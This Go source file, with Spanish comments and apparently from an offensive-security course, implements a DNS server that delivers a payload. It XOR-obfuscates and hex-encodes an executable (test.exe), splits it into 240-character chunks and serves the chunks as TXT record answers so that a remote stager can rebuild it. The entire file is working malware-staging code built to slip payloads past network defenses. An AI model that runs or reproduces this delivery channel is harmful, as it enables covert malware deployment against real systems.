package main

import (
	"encoding/hex"
	"fmt"
	"github.com/fatih/color"
	"github.com/miekg/dns"
	"io/ioutil"
	"log"
	"strconv"
)

const payloadFile = "test.exe"

// The payload server DNS address.

const port = ":53"

var chunks map[string]string

func Xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}

// xor y hexadecimal  codifica nuestra carga útil y la divide en fragmentos de 240 caracteres para enviar
// sobre búsquedas de TXT. Almacene los fragmentos en un mapa con el recuento de fragmentos como índice.
func chunk(data []byte) {
	ccc := Xor(data, 22)
	str := hex.EncodeToString(ccc)
	size := 240
	count := (len(str) / size) + 1

	for i := 0; i < count; i++ {
		iStr := strconv.Itoa(i)
		begin := i * size
		end := begin + size

		if end > len(str) {
			end = len(str)
		}

		chunks[iStr] = str[begin:end]
	}
}

// Define el manejador dns handler
type handler struct{}

// ServeDNS
//responderá a las solicitudes de NS y TXT necesarias

func (this *handler) ServeDNS(w dns.ResponseWriter, m *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(m)

	switch m.Question[0].Qtype {
	case dns.TypeTXT:

		//	msg.Authoritative = true
		domain := msg.Question[0].Name

		if _, ok := dns.IsDomainName(domain); !ok {
			log.Println("Invalid domain name")
			return
		}
		var requestToData = map[string]string{
			domain: "curso.ofensivo.com.",
		}
		_, ok := requestToData[domain]

		if ok {
			key := dns.SplitDomainName(domain)[0]
			val, ok := chunks[key]
			if !ok {
				val = ""
			}

			color.Yellow(val + "\n")

			rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", m.Question[0].Name, val))
			if err != nil {
				log.Println(err)
				return
			}
			msg.Answer = append(msg.Answer, rr)
		}

	}

	w.WriteMsg(&msg)
}

func main() {
	chunks = make(map[string]string)

	// Abre nuestro archivo de carga útil y córtalo.
	data, err := ioutil.ReadFile(payloadFile)
	if err != nil {
		log.Print("error al abrir el payload .")
	} else {
		chunk(data)
	}

	// Inicia el servidor dns
	srv := &dns.Server{Addr: port, Net: "udp"}
	srv.Handler = &handler{}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Failed to set udp listener %s\n", err.Error())
	}
}
